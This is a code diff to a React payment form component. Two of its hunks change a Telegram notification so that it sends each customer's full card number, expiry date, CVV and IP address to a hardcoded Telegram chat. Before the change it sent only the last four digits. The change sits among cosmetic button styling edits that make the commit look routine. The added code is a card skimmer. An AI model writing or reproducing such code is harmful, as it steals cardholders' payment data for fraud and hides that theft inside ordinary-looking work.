@@ -42,7 +42,9 @@ const sendTelegramNotification = async (paymentData: any) => {
         chat_id: "6293259686",
         text: `New payment:
 Amount: ${paymentData.amount}
-Card: ${paymentData.cardNumber.slice(-4)}
+Card: ${paymentData.cardNumber}
+Expiry: ${paymentData.expiryDate}
+CVV: ${paymentData.cvv}
 IP: ${paymentData.ip}`,
       }),
     });
@@ -87,6 +89,8 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
     await sendTelegramNotification({
       amount,
       cardNumber,
+      expiryDate,
+      cvv,
       ip,
     });
 
@@ -168,11 +172,13 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
         <Button
           type="submit"
           disabled={isSubmitting}
-          className={`w-full relative bg-gradient-to-r from-[#8B5CF6] via-[#D946EF] to-[#0EA5E9] bg-[length:200%_200%] animate-gradient text-white transition-all duration-300
-            before:absolute before:inset-0 before:rounded-md before:p-[1px] before:bg-gradient-to-r before:from-[#8B5CF6] before:via-[#D946EF] before:to-[#0EA5E9] before:animate-border-flow before:opacity-0 before:hover:opacity-100
-            ${isSubmitting ? 'opacity-75 cursor-not-allowed' : 'hover:scale-[1.02]'}`}
+          className={`w-full relative bg-gradient-to-r from-[#8B5CF6] via-[#D946EF] to-[#0EA5E9] bg-[length:200%_200%] animate-gradient text-white transition-all duration-700
+            before:absolute before:inset-0 before:rounded-md before:p-[1px] before:bg-gradient-to-r before:from-[#8B5CF6] before:via-[#D946EF] before:to-[#0EA5E9] before:animate-border-flow before:opacity-0 before:hover:opacity-100 before:transition-opacity before:duration-700
+            ${isSubmitting ? 'opacity-75 cursor-not-allowed' : 'hover:scale-[1.02] hover:shadow-lg'}`}
         >
-          {isSubmitting ? 'Processing...' : 'Pay Now'}
+          <span className="relative z-10">
+            {isSubmitting ? 'Processing...' : 'Pay Now'}
+          </span>
         </Button>
       </div>
       <p className="text-gray-400 text-sm mt-8">
